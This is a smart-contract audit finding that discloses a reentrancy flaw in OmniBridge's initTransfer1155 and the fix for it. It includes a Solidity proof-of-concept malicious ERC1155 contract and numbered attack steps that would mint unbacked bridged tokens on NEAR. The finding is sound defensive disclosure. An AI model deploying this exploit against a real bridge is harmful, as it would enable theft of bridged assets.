### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 Callback Allows Emitting `InitTransfer` Events Without Locking Tokens - (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

### Summary
`initTransfer1155` makes an external call to a user-supplied ERC1155 contract (`safeTransferFrom`) before emitting the `InitTransfer` event. A malicious ERC1155 can reenter `initTransfer1155` during this callback, causing multiple `InitTransfer` events to be emitted while zero tokens are actually locked in the bridge. The NEAR side treats any emitted `InitTransfer` event as proof that tokens are held, so it would mint unbacked bridged tokens to the attacker.

### Finding Description

`initTransfer1155` follows this sequence:

1. Increment `currentOriginNonce` (line 448)
2. Call `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` (line 458) — external call to attacker-controlled contract
3. Emit `BridgeTypes.InitTransfer(...)` (line 480) [1](#0-0) 

There is no reentrancy guard on `initTransfer1155`. The `tokenAddress` parameter is fully attacker-controlled and is never validated against any allowlist. A malicious ERC1155 contract can execute arbitrary logic inside its `safeTransferFrom` implementation, including calling back into `initTransfer1155`.

The bridge's `onERC1155Received` hook checks `operator != address(this)` to block direct sends, but this check is irrelevant here: the malicious ERC1155 does not need to call `onERC1155Received` at all — it can simply reenter `initTransfer1155` directly from within its `safeTransferFrom` body and then return without actually transferring any tokens. [2](#0-1) 

The CLAUDE.md security invariant states:

> **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held. [3](#0-2) 

This invariant is broken by the reentrancy: the event is emitted even though no tokens were locked.

### Impact Explanation

The NEAR side's `fin_transfer_callback` verifies only that the emitter address is a known factory (the bridge contract) and that the token has registered decimals. It does not verify that the bridge actually holds the claimed tokens. [4](#0-3) 

If the attacker's malicious ERC1155 token is registered on the NEAR side (via the permissionless `logMetadata1155` → NEAR `LogMetadata` event processing flow), the NEAR side will mint `N × amount` bridged tokens for `N` reentrant `InitTransfer` events, with zero tokens locked on EVM. This constitutes **unauthorized minting of bridged assets** — a Critical impact.

### Likelihood Explanation

- `initTransfer1155` is a public, unpermissioned function callable by any user.
- `logMetadata1155` is also permissionless; any user can register any ERC1155 token.
- The attacker only needs to deploy a malicious ERC1155 contract and call two permissionless bridge functions.
- No privileged role, leaked key, or colluding party is required.
- The bridge has no reentrancy guard on `initTransfer1155`. [5](#0-4) 

### Recommendation

Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply the `nonReentrant` modifier to `initTransfer1155` (and `initTransfer` for defense-in-depth). Alternatively, emit the `InitTransfer` event and call `initTransferExtension` before the external `safeTransferFrom` call (full CEI pattern), though this is harder to reason about for atomicity. The simplest and most robust fix is a reentrancy guard.

```solidity
// Add to OmniBridge storage and inheritance:
import {ReentrancyGuardUpgradeable} from "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";

function initTransfer1155(...) external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) {
    ...
}
```

### Proof of Concept

```solidity
contract MaliciousERC1155 {
    OmniBridge bridge;
    uint256 tokenId;
    uint128 amount;
    bool reentered;

    constructor(address _bridge, uint256 _tokenId, uint128 _amount) {
        bridge = OmniBridge(_bridge);
        tokenId = _tokenId;
        amount = _amount;
    }

    // ERC1155 safeTransferFrom — does NOT actually transfer tokens
    function safeTransferFrom(address, address, uint256, uint256, bytes calldata) external {
        if (!reentered) {
            reentered = true;
            // Reenter initTransfer1155 — nonce is now N+1, no tokens locked
            bridge.initTransfer1155(address(this), tokenId, amount, 0, 0, "attacker.near", "");
        }
        // Return without transferring tokens and without calling onERC1155Received
    }

    // Minimal ERC1155 interface stubs
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

// Attack:
// 1. Deploy MaliciousERC1155
// 2. bridge.logMetadata1155(address(malicious), tokenId)  // register token
// 3. bridge.initTransfer1155(address(malicious), tokenId, amount, 0, 0, "attacker.near", "")
//    → emits InitTransfer(nonce=N, amount=X) and InitTransfer(nonce=N+1, amount=X)
//    → 0 tokens locked in bridge
// 4. NEAR side processes both events → mints 2X unbacked tokens to attacker.near
``` [6](#0-5) [2](#0-1)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L439-490)
```text
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```

**File:** evm/CLAUDE.md (L36-36)
```markdown
- **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held
```

**File:** near/omni-bridge/src/lib.rs (L708-718)
```rust
        require!(
            self.factories
                .get(&init_transfer.emitter_address.get_chain())
                == Some(init_transfer.emitter_address),
            BridgeError::UnknownFactory.as_ref()
        );

        let decimals = self
            .token_decimals
            .get(&init_transfer.token)
            .near_expect(BridgeError::TokenDecimalsNotFound);
```
